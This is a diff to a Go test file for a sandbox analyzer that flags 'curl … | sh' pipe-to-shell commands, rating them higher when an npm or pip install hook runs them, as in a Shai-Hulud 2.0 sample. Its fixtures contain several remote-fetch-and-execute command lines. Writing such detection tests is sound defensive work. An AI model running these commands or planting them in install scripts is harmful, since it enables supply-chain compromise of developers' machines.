@@ -252,6 +252,101 @@ func TestParseSandboxReportTimes(t *testing.T) {
 	}
 }
 
+// curl … | sh run by an install script is high; by the command given, warn.
+// The tree is the commands' pid and ppid (Shai-Hulud 2.0's setup_bun.js,
+// as @antstackio/eslint-config-antstack 0.0.3 ran it).
+func TestHookPipeToShell(t *testing.T) {
+	run := func(lines ...string) *sandboxReport {
+		r := parseSandboxReport(strings.Join(append([]string{"user\tdev"}, lines...), "\n") + "\n")
+		r.Complete = true
+		r.summarize()
+		return r
+	}
+	const pipe = "/bin/sh -c curl -fsSL https://bun.sh/install | bash"
+	hook := []string{
+		"exec\t1\t/bin/bash -c sh run.sh x\t\t\t1918\t1912",
+		"exec\t1\tsh run.sh x\t\t\t1918\t1912",
+		"exec\t1\t/usr/bin/env node /usr/local/bin/npm rebuild --foreground-scripts\t\t\t1920\t1918",
+		"exec\t1\tnode /usr/local/bin/npm rebuild --foreground-scripts\t\t\t1920\t1918",
+		"exec\t1\tsh -c node setup_bun.js\t\t\t1932\t1920",
+		"exec\t1\tnode setup_bun.js\t\t\t1932\t1920",
+		"exec\t1\t" + pipe + "\t\t\t1946\t1932",
+		"exec\t1\tcurl -fsSL https://bun.sh/install\t\t\t1948\t1946",
+		"alert\tpipe_to_shell\t1\t" + pipe + "\tsetup_bun.js",
+	}
+	r := run(hook...)
+	if a := r.Alerts[0]; a.Kind != "hook_pipe_to_shell" || a.Severity != "high" || r.Verdict != "suspicious" {
+		t.Errorf("from npm's install script: %s %s, verdict %s", a.Kind, a.Severity, r.Verdict)
+	}
+	if out := renderReport(r, false, false); !strings.Contains(out, "an install script ran what it downloaded") {
+		t.Errorf("not said:\n%s", out)
+	}
+
+	// the command given, and a shell of it with npm install before: warn
+	for _, c := range [][]string{
+		{"exec\t1\t/bin/bash -c curl -fsSL https://x.example/i.sh | sh\t\t\t50\t40",
+			"alert\tpipe_to_shell\t1\t/bin/bash -c curl -fsSL https://x.example/i.sh | sh\tsh"},
+		{"exec\t1\t/bin/bash -c npm install x && bash -c 'curl x.example | sh'\t\t\t50\t40",
+			"exec\t1\tnode /usr/local/bin/npm install x\t\t\t51\t50",
+			"exec\t1\tbash -c curl x.example | sh\t\t\t52\t50",
+			"alert\tpipe_to_shell\t1\tbash -c curl x.example | sh\tbash"},
+		// npm run: the project's own script, not an install hook
+		{"exec\t1\tnode /usr/local/bin/npm run setup\t\t\t51\t50",
+			"exec\t1\tsh -c curl x.example | sh\t\t\t52\t51",
+			"alert\tpipe_to_shell\t1\tsh -c curl x.example | sh\tnpm"},
+		// an image without the tree
+		{"exec\t1\tnode /usr/local/bin/npm install x", "exec\t1\tsh -c curl x.example | sh",
+			"alert\tpipe_to_shell\t1\tsh -c curl x.example | sh\tnpm"},
+	} {
+		if r := run(c...); r.Alerts[0].Kind != "pipe_to_shell" || r.Verdict != "review" {
+			t.Errorf("%q: %s, verdict %s", c[len(c)-1], r.Alerts[0].Kind, r.Verdict)
+		}
+	}
+
+	// pip building an sdist: setup.py's command, its WHAT cut at 200
+	long := "sh -c curl -fsSL https://x.example/" + strings.Repeat("a", 300) + " | sh"
+	r = run("exec\t1\t.v/bin/python .v/bin/pip install --no-index x.tar.gz\t\t\t60\t50",
+		"exec\t1\t/home/dev/work/.v/bin/python -I .v/lib/pip/_in_process.py build_wheel /tmp/x\t\t\t61\t60",
+		"exec\t1\t"+long[:300]+"...\t\t\t62\t61",
+		"alert\tpipe_to_shell\t1\t"+long[:200]+"...\tpython3")
+	if r.Alerts[0].Kind != "hook_pipe_to_shell" {
+		t.Errorf("from pip's build: %s", r.Alerts[0].Kind)
+	}
+}
+
+func TestInstalling(t *testing.T) {
+	for cmd, want := range map[string]bool{
+		"node /usr/local/bin/npm rebuild --foreground-scripts":      true,
+		"/usr/bin/env node /usr/local/bin/npm install --no-audit x": true,
+		"env -i HOME=/home/dev PATH=/bin npm ci":                    true,
+		"node /usr/lib/node_modules/npm/bin/npm-cli.js i x":         true,
+		"node /usr/local/bin/yarn":                                  true,
+		"node /usr/local/bin/yarn add x":                            true,
+		"node /usr/local/bin/yarn run build":                        false,
+		"pnpm install":                                              true,
+		"bun add x":                                                 true,
+		".v/bin/pip install x":                                      true,
+		"/usr/bin/python3 -m pip install x":                         true,
+		"pip3.12 download x":                                        true,
+		"uv pip install x":                                          true,
+		"uv pip list":                                               false,
+		"uv run x":                                                  false,
+		"python3 setup.py bdist_wheel":                              true,
+		"/usr/bin/python3 -u -c import setuptools; __file__='/tmp/p/setup.py'": true,
+		"python3 /x/pyproject_hooks/_in_process/_in_process.py build_wheel":    true,
+		"node /usr/local/bin/npm run setup":                                    false,
+		"node /usr/local/bin/npm test":                                         false,
+		"node /usr/local/bin/npx x":                                            false,
+		"/bin/bash -c npm install x && curl x | sh":                            false,
+		"node setup_bun.js":                                                    false,
+		"python3 app.py install":                                               false,
+	} {
+		if got := installing(cmd); got != want {
+			t.Errorf("installing(%q) = %v, want %v", cmd, got, want)
+		}
+	}
+}
+
 func TestParseSandboxReport(t *testing.T) {
 	tsv := strings.Join([]string{
 		"since\t2026-10-01 22:40:15.7 +0000", "user\tdev", "token\tabc",
